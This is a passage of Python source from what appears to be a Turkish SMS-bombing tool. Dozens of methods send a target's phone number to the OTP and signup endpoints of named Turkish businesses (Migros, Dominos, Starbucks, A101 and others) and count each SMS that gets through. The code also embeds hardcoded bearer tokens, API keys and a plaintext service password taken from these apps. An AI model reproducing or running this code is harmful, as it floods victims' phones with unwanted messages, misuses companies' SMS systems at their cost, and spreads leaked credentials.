    #migros.com.tr
    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
            headers = {"User-Agent": "Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0", "X-Device-Model": "iPhone 31 Plus", "X-Device-Type": "MOBILE", "X-Device-App-Screen": "OTHER", "X-Device-Language": "tr-TR", "X-Device-App-Version": "10.6.13", "X-Device-Current-Long": "", "X-Request-Identifier": "FBE85947-6E31-49AC-AC8C-317B21D79E80", "X-Device-Selected-Address-Lat": "", "X-Device-Platform-Version": "15.8.0", "X-Device-Current-Lat": "", "X-Device-Platform": "IOS", "X-Store-Ids": "", "X-Device-Longitude": "", "Accept-Language": "tr-TR,tr;q=0.9", "Accept": "*/*", "Content-Type": "application/json", "X-Device-Latitude": "", "Accept-Encoding": "gzip, deflate, br", "X-Device-Selected-Address-Long": "", "X-Device-Identifier": "31CAAD3F-5B53-315B-9C6D-31310D86826C"}
            json={"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")


    #joker.com.tr
    def Joker(self):
        try:
            url = "https://api.joker.com.tr:443/api/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds", "Accept-Encoding": "gzip, deflate", "User-Agent": "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json={"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["message"] == "Doğrulama kodu gönderildi.":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")
            
        
    #ak-asya.com.tr
    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
        
        
    #akbati.com
    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")
    
    
    #clickmelive.com
    def Clickme(self):
        try:
            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.4.0", "Client-Device": "IOS", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile-gateway.clickmelive.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile-gateway.clickmelive.com")
    
    
    #happy.com.tr
    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
            data = {"telephone": self.phone}
            r = requests.post(url=url, data=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
    

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": self.phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
    
    
    #kuryemgelsin.com
    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            json={"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
            
    
    #taksim.digital
    def Taksim(self):
        try:
            url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
            json={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["success"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
            r = requests.post(url=url, json=json, timeout=6)
            if r.json()["Result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
    
    
    #tasimacim.com
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json= {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
    
    
    #toptanteslim.com
    def ToptanTeslim(self):
        try:
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "Mode": "no-cors", "U": "e-ticaret", "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json={"ADRES": "ZXNlZGtm", "DIL": "tr_TR", "EPOSTA": self.mail, "EPOSTA_BILDIRIM": True, "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", "ISLEM": "KayitOl", "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", "KIMLIKNO": None, "KULLANICI_ADI": "Memati", "KULLANICI_SOYADI": "Bas", "PARA_BIRIMI": "TL", "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", "POSTAKODU": "377777", "SEHIR": "\xc4\xb0STANBUL", "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", "SMS_BILDIRIM": True, "TELEFON": self.phone, "TICARI_UNVAN": "kdkd", "ULKE_ID": 1105, "VERGI_DAIRESI": "sjje", "VERGI_NU": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["Durum"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> toptanteslim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> toptanteslim.com")


    #uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
    
    
    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    
    
    #yilmazticaret.net
    def YilmazTicaret(self):
        try:
            url = "http://www.yilmazticaret.net:80/restapi2/register/"
            headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
            data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
            r = requests.post(url, headers=headers,  data=data, timeout=6)
            if r.json()["giris"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")
    
    
    #yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
            

    #beefull.com
    def  Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")


    #starbucks.com.tr
    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            headers = {"Content-Type": "application/json", "Operationchannel": "ios", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br"}
            json={"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": self.mail, "preferredName": "Memati"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["code"] == 50:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> auth.sbuxtr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> auth.sbuxtr.com")


    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")


    #baydoner.com
    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.9", "Platform": "1", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["Control"] == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> crmmobil.baydoner.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> crmmobil.baydoner.com")


    #pidem.com.tr
    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")


    #frink.com.tr
    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")

    #a101
    def a101(self):
        try:
         url = "https://www.a101.com.tr/users/otp-login/"
         payload = {
             "phone" : f"0{self.phone}"
         }
         r = requests.post(url=url, json=payload, timeout=5)
         if r.status_code == 200:
             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
             self.adet += 1
         else:
             raise
        except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")


    #bodrum.bel.tr
    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", }
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")

    #defacto
    def defacto(self):
      try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto")

    #ikinciyeni
    def ikinciyeni(self):
      try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]

        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ikinciyeni")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ikinciyeni")

    #ceptesok
    def ceptesok(self):
      try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number.phone": f"{self.phone}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ceptesok")
            self.adet += 1
        else:
            raise
      except:
         print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ceptesok")

    #pisir
    def pisir(self):
      try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{self.phone}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pisir")
            self.adet += 1
        else:
            raise
      except:
          print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pisir")

    #coffy
    def coffy(self):
      try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phonenumber": f"+90{self.phone}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> coffy")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> coffy")

    #sushico
    def sushico(self):
      try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{self.phone}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sushico")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sushico")

    #kalmasin
    def kalmasin(self):
      try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kalmasin")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kalmasin")

    #yotto
    def yotto(self):
      try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
